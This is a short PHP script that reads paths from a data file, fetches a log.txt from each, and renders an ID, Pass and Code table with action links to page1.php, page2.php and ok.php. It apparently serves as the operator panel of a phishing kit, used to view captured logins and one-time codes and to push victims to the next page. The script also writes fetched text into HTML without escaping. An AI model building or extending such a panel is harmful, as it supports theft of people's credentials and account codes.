<?php


$logs = array();

$path = "data.txt";
$file = fopen($path, 'r');
$data = fread($file, filesize($path));
fclose($file);

$lines = explode("\n", $data);
//print_r($lines);
foreach ($lines as $line) {

  if ($line && !empty($line)) {
    $data = file_get_contents(trim($line) . '/log.txt');

    $logs[] = $line . "\n" . $data;
  }
}
//print_r($logs);
//exit;

?>
<table>
  <tr>
    <td>ID</td>
    <td>Pass</td>
    <td>Code</td>
    <td>Action</td>
  </tr>

  <?php foreach ($logs as $value): ?>
    <?php if ($value && !empty($value)) : ?>
      <?php $data = explode("\n", $value); ?>

      <tr>

        <td><?php print(isset($data[1]) ? $data[1] : ''); ?></td>
        <td><?php print(isset($data[2]) ? $data[2] : ''); ?></td>
        <td><?php print(isset($data[3]) ? $data[3] : ''); ?></td>
        <td><a href="<?php print($data[0]); ?>/page1.php">Page 1</a> <a href="<?php print($data[0]); ?>/page2.php">Page 2</a> <a href="<?php print($data[0]); ?>/ok.php">OK</a> </td>
      </tr>
    <?php endif; ?>
  <?php endforeach; ?>
</table>